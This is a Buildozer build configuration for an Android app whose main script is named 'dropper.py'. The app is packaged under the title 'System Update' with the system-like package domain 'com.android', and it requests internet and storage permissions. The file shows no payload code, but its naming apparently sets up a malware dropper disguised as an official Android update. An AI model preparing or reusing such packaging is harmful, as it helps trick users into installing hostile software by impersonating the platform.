[app]

title = System Update
package.name = systemupdate
package.domain = com.android
source.dir = .
source.main = dropper.py
source.include_exts = py,png,jpg,kv,atlas
version = 0.1

requirements = python3,requests,urllib3,charset-normalizer==2.1.1
android.ndk = 28c
p4a.branch = develop

android.api = 33
android.minapi = 21
android.private_storage = True
android.theme = "@android:style/Theme.NoTitleBar"
android.copy_libs = 1
android.archs = arm64-v8a
android.numeric_version = 1
android.accept_sdk_license = True
android.permissions = INTERNET,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE

[buildozer]
log_level = 2
warn_on_root = 1
build_dir = .buildozer
bin_dir = ./bin
